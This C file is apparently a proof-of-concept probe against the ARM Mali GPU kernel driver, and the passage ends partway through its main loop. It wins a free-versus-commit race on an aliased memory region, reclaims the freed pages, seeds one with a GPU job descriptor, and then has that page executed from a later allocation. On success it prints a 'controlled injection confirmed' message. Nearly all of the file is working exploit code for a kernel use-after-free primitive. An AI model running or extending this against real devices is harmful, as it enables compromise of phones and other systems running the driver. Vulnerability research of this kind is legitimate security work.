/*
 * mali_alias_controlled_injection_probe.c -- Test whether attacker-seeded data
 * written into reclaimed alias-race pages survives another alloc/free cycle and
 * can execute later as a GPU-consumed JC page.
 *
 * Safe model:
 *   1. Allocate a native 16-page region and tag source pages 8-15 uniquely.
 *   2. Create a GPU-only alias covering native pages 8-15.
 *   3. Win the proven MEM_FREE(alias) vs MEM_COMMIT(native->8) race.
 *   4. Reserve the old alias VA window with commit=0 to keep later allocations
 *      disjoint from the stale numeric alias range.
 *   5. Allocate the first disjoint 8-page reclaim buffer and confirm it carries
 *      the tagged source pages.
 *   6. Seed one reclaimed page with a valid WRITE_VALUE-ZERO descriptor plus a
 *      page-local sentinel, then free that reclaim buffer.
 *   7. Allocate fresh victim buffers until the sentinel reappears.
 *   8. Submit the reappeared page as a JC without rewriting it.
 *
 * Positive result:
 *   The victim page preserves the attacker-seeded descriptor and the GPU zeros
 *   the scratch target, proving controlled-content injection into a later
 *   GPU-consumed control surface.
 *
 * Safety:
 *   - fork + alarm
 *   - single-atom submissions only
 *   - no stale mapping write attempts
 *   - bounded reclaim/victim allocations with full cleanup each iteration
 */

#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_COMMIT  (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY   (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS   (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT  (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD      (1U << 0)
#define BASE_MEM_PROT_CPU_WR      (1U << 1)
#define BASE_MEM_PROT_GPU_RD      (1U << 2)
#define BASE_MEM_PROT_GPU_WR      (1U << 3)
#define BASE_MEM_GROW_ON_GPF      (1U << 9)
#define BASE_MEM_COHERENT_LOCAL   (1U << 11)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1

#define BASE_JD_REQ_CS                 (1U << 1)

#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_JD_EVENT_DONE               0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED      0x00004002
#define BASE_JD_EVENT_JOB_INVALID        0x00004003

#define PAGE_BYTES          4096U
#define NATIVE_PAGES        16U
#define SOURCE_OFFSET_PAGES 8U
#define SOURCE_PAGES        8U
#define RECLAIM_PAGES       8U
#define MAX_RACE_ITERS      20
#define MAX_RECLAIM_ALLOCS  8
#define MAX_VICTIM_ALLOCS   8
#define SOURCE_ID_NONE      0xFFU
#define CANARY64            0xDEADBEEFCAFEBABEULL
#define SCRATCH64           0xAAAAAAAAAAAAAAAAULL
#define JC_SENTINEL         0x4a43534545443030ULL /* "JCSEED00" */
#define JC_META_MAGIC       0x4a434d4554413030ULL /* "JCMETA00" */
#define JC_SENTINEL_WORD    16U

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
    uint32_t padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

struct base_jd_udata {
    uint64_t blob[2];
};

struct base_dependency {
    uint8_t atom_id;
    uint8_t dependency_type;
};

struct base_jd_atom_v2_old56 {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number;
    uint8_t prio;
    uint8_t device_nr;
    uint8_t padding[5];
    uint8_t extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t addr;
    uint32_t nr_atoms;
    uint32_t stride;
    uint32_t gles_ctx_handle;
    uint32_t padding;
};

struct base_jd_event_v2 {
    uint32_t event_code;
    uint8_t atom_number;
    uint8_t pad[3];
    struct base_jd_udata udata;
};

struct mapped_alloc {
    uint64_t gpu_va;
    uint64_t *cpu;
    uint8_t source_ids[RECLAIM_PAGES];
    unsigned source_bitmap;
    int source_page_count;
    int overlaps_alias;
};

struct attempt_result {
    int race_won;
    int reserved_window;
    int reclaim_seeded;
    int victim_hit;
    int execute_hit;
    int reclaim_alloc_index;
    int victim_alloc_index;
    size_t seed_page_index;
    size_t victim_page_index;
    uint8_t seed_source_id;
    uint32_t execute_event;
};

static int g_fd = -1;
static volatile int g_ready = 0;
static int g_commit_ret = -1;
static uint64_t g_alias_gpu_va = 0;
static uint64_t g_native_gpu_va = 0;

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;
    void *mtp;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;

    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED) {
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    }
    return (mtp == MAP_FAILED) ? -1 : 0;
}

static uint64_t mali_alloc_ext(int fd, uint64_t va_pages, uint64_t commit_pages,
                               uint64_t extent, uint32_t flags)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = va_pages;
    alloc.commit_pages = commit_pages;
    alloc.extent = extent;
    alloc.flags = flags;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static uint64_t mali_alloc_flags(int fd, uint64_t pages, uint32_t flags)
{
    return mali_alloc_ext(fd, pages, pages, pages, flags);
}

static int mali_commit(int fd, uint64_t gpu_va, uint64_t pages)
{
    struct kbase_uk_mem_commit commit;

    memset(&commit, 0, sizeof(commit));
    commit.header.id = KBASE_FUNC_MEM_COMMIT;
    commit.gpu_addr = gpu_va;
    commit.pages = pages;
    mali_ioctl(fd, &commit, sizeof(commit));
    return commit.header.ret;
}

static uint64_t mali_query_commit(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_query query;

    memset(&query, 0, sizeof(query));
    query.header.id = KBASE_FUNC_MEM_QUERY;
    query.gpu_addr = gpu_va;
    query.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    mali_ioctl(fd, &query, sizeof(query));
    return query.value;
}

static uint64_t mali_alias(int fd, uint64_t src_gpu_va, uint64_t offset_pages,
                           uint64_t length_pages)
{
    struct base_mem_aliasing_info info;
    struct kbase_uk_mem_alias alias;

    memset(&info, 0, sizeof(info));
    info.handle = src_gpu_va;
    info.offset = offset_pages;
    info.length = length_pages;

    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = length_pages;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&info;
    if (mali_ioctl(fd, &alias, sizeof(alias)) < 0)
        return 0;
    return alias.header.ret == 0 ? alias.gpu_va : 0;
}

static void mali_free(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free free_req;

    if (!gpu_va)
        return;
    memset(&free_req, 0, sizeof(free_req));
    free_req.header.id = KBASE_FUNC_MEM_FREE;
    free_req.gpu_addr = gpu_va;
    mali_ioctl(fd, &free_req, sizeof(free_req));
}

static void *mali_cpu_map(int fd, uint64_t gpu_va, size_t bytes)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, bytes,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static int ranges_overlap(uint64_t start_a, uint64_t pages_a,
                          uint64_t start_b, uint64_t pages_b)
{
    uint64_t end_a = start_a + pages_a * PAGE_BYTES;
    uint64_t end_b = start_b + pages_b * PAGE_BYTES;

    return !(end_a <= start_b || end_b <= start_a);
}

static const char *event_name(uint32_t code)
{
    switch (code) {
    case BASE_JD_EVENT_DONE: return "DONE";
    case BASE_JD_EVENT_DATA_INVALID_FAULT: return "DATA_INVALID_FAULT";
    case BASE_JD_EVENT_JOB_CANCELLED: return "JOB_CANCELLED";
    case BASE_JD_EVENT_JOB_INVALID: return "JOB_INVALID";
    default: return "UNKNOWN";
    }
}

static int read_event(int fd, struct base_jd_event_v2 *ev)
{
    struct pollfd pfd = { fd, POLLIN | POLLERR | POLLHUP, 0 };

    if (poll(&pfd, 1, 3000) <= 0)
        return -1;
    return read(fd, ev, sizeof(*ev)) == (ssize_t)sizeof(*ev) ? 0 : -1;
}

static void fill_atom(struct base_jd_atom_v2_old56 *atom, uint64_t jc, uint8_t atom_number)
{
    memset(atom, 0, sizeof(*atom));
    atom->jc = jc;
    atom->core_req = BASE_JD_REQ_CS;
    atom->atom_number = atom_number;
    atom->udata.blob[0] = 0xBEEF000000000000ULL | atom_number;
}

static void build_wv_desc(uint32_t *jc_cpu, uint64_t target_gpu_va)
{
    memset(jc_cpu, 0, 56);
    jc_cpu[4] = 0x00010005;
    jc_cpu[8] = (uint32_t)target_gpu_va;
    jc_cpu[9] = (uint32_t)(target_gpu_va >> 32);
    jc_cpu[10] = MALI_WRITE_VALUE_TYPE_ZERO;
}

static int submit_jc(int fd, uint64_t jc_gpu_va, uint8_t atom_number, uint32_t *event_code_out)
{
    struct base_jd_atom_v2_old56 atom;
    struct kbase_uk_job_submit_trace submit;
    struct base_jd_event_v2 ev;

    fill_atom(&atom, jc_gpu_va, atom_number);

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(atom);
    if (mali_ioctl(fd, &submit, sizeof(submit)) < 0 || submit.header.ret != 0)
        return -1;
    if (read_event(fd, &ev) < 0)
        return -1;
    if (event_code_out)
        *event_code_out = ev.event_code;
    return 0;
}

static int submit_write_value(int fd, uint32_t *jc_cpu, uint64_t jc_gpu_va,
                              uint64_t target_gpu_va, uint8_t atom_number,
                              uint32_t *event_code_out)
{
    build_wv_desc(jc_cpu, target_gpu_va);
    __builtin___clear_cache((char *)jc_cpu, (char *)jc_cpu + PAGE_BYTES);
    __sync_synchronize();
    return submit_jc(fd, jc_gpu_va, atom_number, event_code_out);
}

static uint64_t source_tag(uint8_t source_id)
{
    return CANARY64 ^ ((uint64_t)(source_id + 1U) << 56);
}

static int source_tag_to_id(uint64_t value)
{
    uint8_t source_id;

    for (source_id = 0; source_id < SOURCE_PAGES; source_id++) {
        if (value == source_tag(source_id))
            return (int)source_id;
    }
    return -1;
}

static void fill_source_tags(uint8_t *cpu_base)
{
    size_t page;
    size_t word;
    size_t words_per_page = PAGE_BYTES / sizeof(uint64_t);

    for (page = 0; page < SOURCE_PAGES; page++) {
        uint64_t value = source_tag((uint8_t)page);
        uint64_t *page_cpu = (uint64_t *)(cpu_base + (SOURCE_OFFSET_PAGES + page) * PAGE_BYTES);

        for (word = 0; word < words_per_page; word++)
            page_cpu[word] = value;
    }
}

static int snapshot_source_pages(const uint64_t *cpu_base, size_t pages, uint8_t *source_ids)
{
    size_t i;
    size_t page_stride = PAGE_BYTES / sizeof(uint64_t);
    int count = 0;

    memset(source_ids, SOURCE_ID_NONE, pages);
    for (i = 0; i < pages; i++) {
        int source_id = source_tag_to_id(cpu_base[i * page_stride]);

        if (source_id >= 0) {
            source_ids[i] = (uint8_t)source_id;
            count++;
        }
    }
    return count;
}

static unsigned source_bitmap_from_ids(const uint8_t *source_ids, size_t pages)
{
    size_t i;
    unsigned bitmap = 0;

    for (i = 0; i < pages; i++) {
        if (source_ids[i] != SOURCE_ID_NONE)
            bitmap |= (1U << source_ids[i]);
    }
    return bitmap;
}

static void format_source_ids(unsigned bitmap, char *buf, size_t buf_len)
{
    size_t used = 0;
    unsigned source_id;

    if (!bitmap) {
        snprintf(buf, buf_len, "none");
        return;
    }

    buf[0] = '\0';
    for (source_id = 0; source_id < SOURCE_PAGES; source_id++) {
        int written;

        if (!(bitmap & (1U << source_id)))
            continue;
        written = snprintf(buf + used, buf_len - used, "%s%u",
                           used ? "," : "", source_id);
        if (written < 0 || (size_t)written >= buf_len - used)
            break;
        used += (size_t)written;
    }
}

static int select_source_page(const uint8_t *source_ids, size_t pages,
                              uint8_t *source_id_out, size_t *page_index_out)
{
    size_t i;

    for (i = 0; i < pages; i++) {
        if (source_ids[i] != SOURCE_ID_NONE) {
            *source_id_out = source_ids[i];
            *page_index_out = i;
            return 1;
        }
    }
    return 0;
}

static void seed_descriptor_page(uint64_t *page_cpu, uint64_t target_gpu_va, uint8_t source_id)
{
    uint32_t *jc_cpu = (uint32_t *)page_cpu;

    memset(page_cpu, 0, PAGE_BYTES);
    build_wv_desc(jc_cpu, target_gpu_va);
    page_cpu[JC_SENTINEL_WORD] = JC_SENTINEL;
    page_cpu[JC_SENTINEL_WORD + 1] = (JC_META_MAGIC & ~0xFFULL) | (uint64_t)source_id;
    page_cpu[JC_SENTINEL_WORD + 2] = target_gpu_va;
    __builtin___clear_cache((char *)page_cpu, (char *)page_cpu + PAGE_BYTES);
    __sync_synchronize();
}

static int find_seeded_page(const uint64_t *cpu_base, size_t pages,
                            size_t *page_index_out, uint8_t *source_id_out)
{
    size_t i;
    size_t page_stride = PAGE_BYTES / sizeof(uint64_t);

    for (i = 0; i < pages; i++) {
        const uint64_t *page_cpu = cpu_base + i * page_stride;

        if (page_cpu[JC_SENTINEL_WORD] == JC_SENTINEL &&
            (page_cpu[JC_SENTINEL_WORD + 1] & ~0xFFULL) == (JC_META_MAGIC & ~0xFFULL)) {
            *page_index_out = i;
            *source_id_out = (uint8_t)(page_cpu[JC_SENTINEL_WORD + 1] & 0xFFU);
            return 1;
        }
    }
    return 0;
}

static int verify_control_submit(int fd)
{
    uint64_t scratch_va = 0;
    uint64_t jc_va = 0;
    uint64_t *scratch_cpu = MAP_FAILED;
    uint32_t *jc_cpu = MAP_FAILED;
    uint32_t event_code = 0;
    int ok = -1;

    scratch_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                      BASE_MEM_COHERENT_LOCAL);
    jc_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_COHERENT_LOCAL);
    if (!scratch_va || !jc_va)
        goto cleanup;

    scratch_cpu = mali_cpu_map(fd, scratch_va, PAGE_BYTES);
    jc_cpu = mali_cpu_map(fd, jc_va, PAGE_BYTES);
    if (scratch_cpu == MAP_FAILED || jc_cpu == MAP_FAILED)
        goto cleanup;

    scratch_cpu[0] = SCRATCH64;
    if (submit_write_value(fd, jc_cpu, jc_va, scratch_va, 0x10, &event_code) < 0)
        goto cleanup;
    if (event_code == BASE_JD_EVENT_DONE && scratch_cpu[0] == 0)
        ok = 0;

cleanup:
    if (jc_cpu != MAP_FAILED)
        munmap(jc_cpu, PAGE_BYTES);
    if (scratch_cpu != MAP_FAILED)
        munmap(scratch_cpu, PAGE_BYTES);
    if (jc_va)
        mali_free(fd, jc_va);
    if (scratch_va)
        mali_free(fd, scratch_va);
    return ok;
}

static int verify_prereqs(int fd)
{
    uint64_t native_va;
    uint64_t alias_va;
    int shrink_with_alias;
    int shrink_without_alias;
    uint64_t commit_now;

    native_va = mali_alloc_flags(fd, NATIVE_PAGES,
                                 BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_GROW_ON_GPF);
    if (!native_va)
        return -1;

    alias_va = mali_alias(fd, native_va, SOURCE_OFFSET_PAGES, SOURCE_PAGES);
    if (!alias_va) {
        mali_free(fd, native_va);
        return -1;
    }

    shrink_with_alias = mali_commit(fd, native_va, SOURCE_OFFSET_PAGES);
    mali_free(fd, alias_va);
    shrink_without_alias = mali_commit(fd, native_va, SOURCE_OFFSET_PAGES);
    commit_now = mali_query_commit(fd, native_va);
    mali_free(fd, native_va);

    if (shrink_with_alias == 0 || shrink_without_alias != 0 || commit_now != SOURCE_OFFSET_PAGES)
        return -1;

    return verify_control_submit(fd);
}

static void *thread_free(void *arg)
{
    (void)arg;
    while (!g_ready) {
    }
    mali_free(g_fd, g_alias_gpu_va);
    return NULL;
}

static void *thread_commit(void *arg)
{
    (void)arg;
    while (!g_ready) {
    }
    g_commit_ret = mali_commit(g_fd, g_native_gpu_va, SOURCE_OFFSET_PAGES);
    return NULL;
}

static int reserve_alias_window(int fd, uint64_t alias_va, uint64_t *guard_va_out)
{
    uint64_t window_va;
    uint64_t window_commit;

    window_va = mali_alloc_ext(fd, SOURCE_PAGES, 0, SOURCE_PAGES,
                               BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                               BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                               BASE_MEM_GROW_ON_GPF);
    if (!window_va)
        return 0;

    window_commit = mali_query_commit(fd, window_va);
    if (window_va == alias_va && window_commit == 0) {
        *guard_va_out = window_va;
        return 1;
    }

    printf("[*] reserve miss: zero-commit window landed at 0x%llx commit=%llu instead of stale alias 0x%llx\n",
           (unsigned long long)window_va,
           (unsigned long long)window_commit,
           (unsigned long long)alias_va);
    mali_free(fd, window_va);
    return 0;
}

static int alloc_mapped_region(int fd, uint64_t alias_va, struct mapped_alloc *slot)
{
    memset(slot, 0, sizeof(*slot));
    slot->gpu_va = mali_alloc_flags(fd, RECLAIM_PAGES,
                                    BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                    BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                    BASE_MEM_GROW_ON_GPF);
    if (!slot->gpu_va)
        return -1;

    slot->cpu = mali_cpu_map(fd, slot->gpu_va, RECLAIM_PAGES * PAGE_BYTES);
    if (slot->cpu == MAP_FAILED) {
        slot->cpu = NULL;
        mali_free(fd, slot->gpu_va);
        slot->gpu_va = 0;
        return -1;
    }

    slot->source_page_count = snapshot_source_pages(slot->cpu, RECLAIM_PAGES, slot->source_ids);
    slot->source_bitmap = source_bitmap_from_ids(slot->source_ids, RECLAIM_PAGES);
    slot->overlaps_alias = ranges_overlap(slot->gpu_va, RECLAIM_PAGES, alias_va, SOURCE_PAGES);
    return 0;
}

static void free_mapped_region(int fd, struct mapped_alloc *slot)
{
    if (slot->cpu) {
        munmap(slot->cpu, RECLAIM_PAGES * PAGE_BYTES);
        slot->cpu = NULL;
    }
    if (slot->gpu_va) {
        mali_free(fd, slot->gpu_va);
        slot->gpu_va = 0;
    }
}

static int find_disjoint_reclaim_candidate(int fd, uint64_t alias_va,
                                           struct mapped_alloc *slot,
                                           int *alloc_index_out)
{
    int i;

    for (i = 0; i < MAX_RECLAIM_ALLOCS; i++) {
        char ids_buf[64];

        if (alloc_mapped_region(fd, alias_va, slot) < 0)
            return -1;

        format_source_ids(slot->source_bitmap, ids_buf, sizeof(ids_buf));
        printf("[*] reclaim alloc=%d gpu_va=0x%llx overlap=%s tagged=%d ids=%s\n",
               i + 1,
               (unsigned long long)slot->gpu_va,
               slot->overlaps_alias ? "yes" : "no",
               slot->source_page_count,
               ids_buf);

        if (slot->source_page_count > 0 && !slot->overlaps_alias) {
            *alloc_index_out = i + 1;
            return 1;
        }

        free_mapped_region(fd, slot);
    }

    return 0;
}

static int find_seeded_victim(int fd, uint64_t alias_va, struct mapped_alloc *slot,
                              int *alloc_index_out, size_t *page_index_out,
                              uint8_t *source_id_out)
{
    int i;

    for (i = 0; i < MAX_VICTIM_ALLOCS; i++) {
        char ids_buf[64];

        if (alloc_mapped_region(fd, alias_va, slot) < 0)
            return -1;

        format_source_ids(slot->source_bitmap, ids_buf, sizeof(ids_buf));
        printf("[*] victim alloc=%d gpu_va=0x%llx overlap=%s tagged=%d ids=%s\n",
               i + 1,
               (unsigned long long)slot->gpu_va,
               slot->overlaps_alias ? "yes" : "no",
               slot->source_page_count,
               ids_buf);

        if (find_seeded_page(slot->cpu, RECLAIM_PAGES, page_index_out, source_id_out)) {
            *alloc_index_out = i + 1;
            return 1;
        }

        free_mapped_region(fd, slot);
    }

    return 0;
}

static int run_injection_attempt(int fd, int iter, struct attempt_result *result)
{
    uint64_t native_va = 0;
    uint64_t alias_va = 0;
    uint64_t guard_va = 0;
    uint64_t scratch_va = 0;
    uint8_t *native_cpu = MAP_FAILED;
    uint64_t *scratch_cpu = MAP_FAILED;
    struct mapped_alloc reclaim_slot;
    struct mapped_alloc victim_slot;
    size_t reclaim_page_index = 0;
    size_t victim_page_index = 0;
    uint8_t seed_source_id = SOURCE_ID_NONE;
    uint8_t victim_source_id = SOURCE_ID_NONE;
    int rc = 0;

    memset(result, 0, sizeof(*result));
    memset(&reclaim_slot, 0, sizeof(reclaim_slot));
    memset(&victim_slot, 0, sizeof(victim_slot));

    native_va = mali_alloc_flags(fd, NATIVE_PAGES,
                                 BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_GROW_ON_GPF);
    if (!native_va) {
        printf("[-] iter %d: native alloc failed\n", iter);
        return -1;
    }

    native_cpu = mali_cpu_map(fd, native_va, NATIVE_PAGES * PAGE_BYTES);
    if (native_cpu == MAP_FAILED) {
        printf("[-] iter %d: native mmap failed errno=%d\n", iter, errno);
        rc = -1;
        goto cleanup;
    }
    fill_source_tags(native_cpu);
    __sync_synchronize();

    alias_va = mali_alias(fd, native_va, SOURCE_OFFSET_PAGES, SOURCE_PAGES);
    if (!alias_va) {
        printf("[-] iter %d: alias failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    g_fd = fd;
    g_native_gpu_va = native_va;
    g_alias_gpu_va = alias_va;
    g_commit_ret = -1;
    g_ready = 0;

    {
        pthread_t t_free;
        pthread_t t_commit;

        pthread_create(&t_free, NULL, thread_free, NULL);
        pthread_create(&t_commit, NULL, thread_commit, NULL);
        usleep(iter % 7);
        g_ready = 1;
        pthread_join(t_free, NULL);
        pthread_join(t_commit, NULL);
    }
    alias_va = 0;

    if (g_commit_ret != 0) {
        printf("[*] iter %d: race miss (commit ret=%d)\n", iter, g_commit_ret);
        goto cleanup;
    }

    result->race_won = 1;
    printf("[!!!] iter %d: race won (commit_now=%llu old_alias=0x%llx)\n",
           iter,
           (unsigned long long)mali_query_commit(fd, native_va),
           (unsigned long long)g_alias_gpu_va);

    if (!reserve_alias_window(fd, g_alias_gpu_va, &guard_va)) {
        printf("[*] iter %d: failed to pin stale alias window cleanly\n", iter);
        goto cleanup;
    }
    result->reserved_window = 1;
    printf("[+] iter %d: reserved stale alias window at 0x%llx with commit=0\n",
           iter, (unsigned long long)guard_va);

    scratch_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                      BASE_MEM_COHERENT_LOCAL);
    if (!scratch_va) {
        printf("[-] iter %d: scratch alloc failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    scratch_cpu = mali_cpu_map(fd, scratch_va, PAGE_BYTES);
    if (scratch_cpu == MAP_FAILED) {
        printf("[-] iter %d: scratch mmap failed errno=%d\n", iter, errno);
        rc = -1;
        goto cleanup;
    }
    scratch_cpu[0] = SCRATCH64;

    rc = find_disjoint_reclaim_candidate(fd, g_alias_gpu_va, &reclaim_slot,
                                         &result->reclaim_alloc_index);
    if (rc <= 0) {
        printf("[*] iter %d: no disjoint reclaim candidate with tagged pages (%d)\n", iter, rc);
        rc = (rc < 0) ? -1 : 0;
        goto cleanup;
    }

    if (!select_source_page(reclaim_slot.source_ids, RECLAIM_PAGES,
                            &seed_source_id, &reclaim_page_index)) {
        printf("[-] iter %d: reclaim candidate had no selectable tagged page\n", iter);
        rc = -1;
        goto cleanup;
    }

    seed_descriptor_page(reclaim_slot.cpu +
                             reclaim_page_index * (PAGE_BYTES / sizeof(uint64_t)),
                         scratch_va, seed_source_id);
    result->reclaim_seeded = 1;
    result->seed_page_index = reclaim_page_index;
    result->seed_source_id = seed_source_id;
    printf("[+] iter %d: seeded reclaim alloc=%d page=%zu source_page=%u target=0x%llx\n",
           iter,
           result->reclaim_alloc_index,
           reclaim_page_index,
           seed_source_id,
           (unsigned long long)scratch_va);

    free_mapped_region(fd, &reclaim_slot);

    rc = find_seeded_victim(fd, g_alias_gpu_va, &victim_slot,
                            &result->victim_alloc_index, &victim_page_index,
                            &victim_source_id);
    if (rc <= 0) {
        printf("[*] iter %d: no victim allocation preserved the seeded descriptor (%d)\n", iter, rc);
        rc = (rc < 0) ? -1 : 0;
        goto cleanup;
    }

    result->victim_hit = 1;
    result->victim_page_index = victim_page_index;
    printf("[+] iter %d: victim alloc=%d page=%zu preserved seed (source=%u)\n",
           iter,
           result->victim_alloc_index,
           victim_page_index,
           victim_source_id);

    if (scratch_cpu[0] != SCRATCH64) {
        printf("[-] iter %d: scratch mutated before victim submit\n", iter);
        rc = -1;
        goto cleanup;
    }

    if (submit_jc(fd,
                  victim_slot.gpu_va + victim_page_index * PAGE_BYTES,
                  0x40, &result->execute_event) < 0) {
        printf("[-] iter %d: victim submit failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    printf("[*] iter %d: victim JC submit event=%s scratch=0x%016llx\n",
           iter,
           event_name(result->execute_event),
           (unsigned long long)scratch_cpu[0]);

    if (result->execute_event == BASE_JD_EVENT_DONE && scratch_cpu[0] == 0) {
        result->execute_hit = 1;
        printf("[!!!] CONTROLLED INJECTION CONFIRMED\n");
        printf("      seeded source page %u survived reclaim free/realloc and executed as JC at victim page %zu\n",
               seed_source_id, victim_page_index);
        rc = 1;
        goto cleanup;
    }

    printf("[*] iter %d: victim page preserved the seed but did not execute cleanly\n", iter);
    rc = 0;

cleanup:
    free_mapped_region(fd, &victim_slot);
    free_mapped_region(fd, &reclaim_slot);
    if (scratch_cpu != MAP_FAILED)
        munmap(scratch_cpu, PAGE_BYTES);
    if (scratch_va)
        mali_free(fd, scratch_va);
    if (guard_va)
        mali_free(fd, guard_va);
    if (alias_va)
        mali_free(fd, alias_va);
    if (native_cpu != MAP_FAILED)
        munmap(native_cpu, NATIVE_PAGES * PAGE_BYTES);
    if (native_va)
        mali_free(fd, native_va);
    return rc;
}

static void run_probe(void)
{
    int i;
    int race_wins = 0;
    int seed_hits = 0;
    int victim_hits = 0;

    printf("=== mali_alias_controlled_injection_probe ===\n");
    printf("Seed a reclaimed alias-race page, free it, and test whether a later\n");
    printf("allocation preserves that descriptor well enough to execute as a JC page.\n\n");

    g_fd = open("/dev/mali0", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (g_fd < 0) {
        perror("open /dev/mali0");
        return;
    }
    if (mali_init(g_fd) < 0) {
        perror("mali_init");
        close(g_fd);
        return;
    }

    if (verify_prereqs(g_fd) < 0) {
        printf("[-] prereqs failed: alias race or baseline WRITE_VALUE control did not pass\n");
        close(g_fd);
        return;
    }

    for (i = 1; i <= MAX_RACE_ITERS; i++) {
        struct attempt_result result;
        int rc = run_injection_attempt(g_fd, i, &result);

        if (result.race_won)
            race_wins++;
        if (result.reclaim_seeded)
            seed_hits++;
        if (result.victim_hit)
            victim_hits++;

        if (rc > 0) {
            printf("\n[+] Positive controlled-injection signal on iter %d\n", i);
